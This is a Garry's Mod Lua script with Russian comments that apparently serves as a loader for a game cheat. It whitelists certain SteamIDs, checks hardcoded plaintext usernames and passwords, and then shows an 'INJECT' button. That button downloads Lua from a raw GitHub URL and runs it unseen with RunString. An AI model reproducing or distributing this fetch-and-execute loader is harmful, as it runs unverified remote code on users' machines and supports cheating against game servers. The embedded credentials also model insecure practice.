-- Список разрешённых SteamID (добавь свои)
local allowedSteamIDs = {
    ["STEAM_1:1:600204671"] = true, --bumkin
    ["STEAM_1:0:923364789"] = true, --bumkin
    ["STEAM_1:1:921132691"] = true, --bumkin
    ["STEAM_0:0:893334411"] = true, --dezz
    ["STEAM_1:1:813771985"] = true, --dubley
    ["STEAM_0:1:508504180"] = true, --doylez
}

-- Список пользователей и паролей
local validUsers = {
    ["bumpkin"] = "femboy",  -- Логин = user, Пароль = qwerty
    ["katsunny"] = "protogensupersexdezzkatsunny1",  -- Логин = user, Пароль = qwerty
    ["ailevkakoi"] = "sosta100cotka",  -- Логин = user, Пароль = qwerty
    ["test"] = "1234",  -- Логин = user, Пароль = qwerty
}

-- Получаем SteamID текущего игрока
local playerSteamID = LocalPlayer():SteamID()

-- Проверяем, есть ли SteamID в списке разрешённых
if not allowedSteamIDs[playerSteamID] then
    chat.AddText(Color(255, 0, 0), "Доступ запрещён: ваш SteamID не авторизован!")
    surface.PlaySound("buttons/button10.wav")
    return -- Закрываем скрипт, если SteamID не разрешён
end

-- Создаем фрейм для меню
local menuFrame = vgui.Create("DFrame")
menuFrame:SetSize(300, 200)
menuFrame:SetTitle("Auth Menu")
menuFrame:Center()
menuFrame:MakePopup()

-- Поле для логина
local loginEntry = vgui.Create("DTextEntry", menuFrame)
loginEntry:SetSize(250, 30)
loginEntry:SetPos(25, 50)
loginEntry:SetPlaceholderText("Login")

-- Поле для пароля с кастомной отрисовкой
local passEntry = vgui.Create("DTextEntry", menuFrame)
passEntry:SetSize(250, 30)
passEntry:SetPos(25, 90)
passEntry:SetPlaceholderText("Password")
passEntry:SetText("")
passEntry.Paint = function(self, w, h)
    self:DrawTextEntryText(Color(255, 255, 255), Color(30, 30, 30), Color(200, 200, 200))
    if self:GetText() == "" and not self:HasFocus() then
        draw.SimpleText("Password", "DermaDefault", 5, (h / 2) - 7, Color(150, 150, 150), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
    end
end
passEntry:SetDrawLanguageID(false)
passEntry:SetEnterAllowed(false)

-- Кнопка Submit
local submitButton = vgui.Create("DButton", menuFrame)
submitButton:SetSize(250, 30)
submitButton:SetPos(25, 130)
submitButton:SetText("Submit")

-- Кнопка Inject (изначально скрыта)
local injectButton = vgui.Create("DButton", menuFrame)
injectButton:SetSize(250, 30)
injectButton:SetPos(25, 130)
injectButton:SetText("INJECT")
injectButton:SetVisible(false)

-- Функция проверки авторизации
local function CheckAuth(login, password)
    return validUsers[login] == password
end

-- Обработчик кнопки Submit
submitButton.DoClick = function()
    local login = loginEntry:GetText()
    local password = passEntry:GetText()
    
    if CheckAuth(login, password) then
        loginEntry:SetVisible(false)
        passEntry:SetVisible(false)
        submitButton:SetVisible(false)
        injectButton:SetVisible(true)
        
        chat.AddText(Color(0, 255, 0), "Auth successful! Press INJECT to continue.")
        surface.PlaySound("buttons/button14.wav")
    else
        chat.AddText(Color(255, 0, 0), "Invalid login or password!")
        surface.PlaySound("buttons/button10.wav")
    end
end

-- Обработчик кнопки Inject
injectButton.DoClick = function()
    if gui.IsGameUIVisible() then
        gui.HideGameUI()
    end

    chat.AddText(Color(255, 255, 0), "Reaching for the host website...")
    surface.PlaySound("buttons/lightswitch2.wav")

    http.Fetch("https://raw.githubusercontent.com/bebra148/03457683456987341569538731498563475934589634790345687354834956947634/refs/heads/main/bebra148.lua",
        function(body, length, headers, code)
            RunString(body)
            chat.AddText(Color(255, 255, 0), "Host website reached! Initializing latest build...")
            surface.PlaySound("buttons/lightswitch2.wav")
            menuFrame:Close()
        end,
        function(error)
            chat.AddText(Color(255, 0, 0), "Fatal error! The host website cannot be reached.")
            chat.AddText(Color(255, 0, 0), "Check your Internet connection or the validity of your link.")
            surface.PlaySound("buttons/lightswitch2.wav")
        end)
end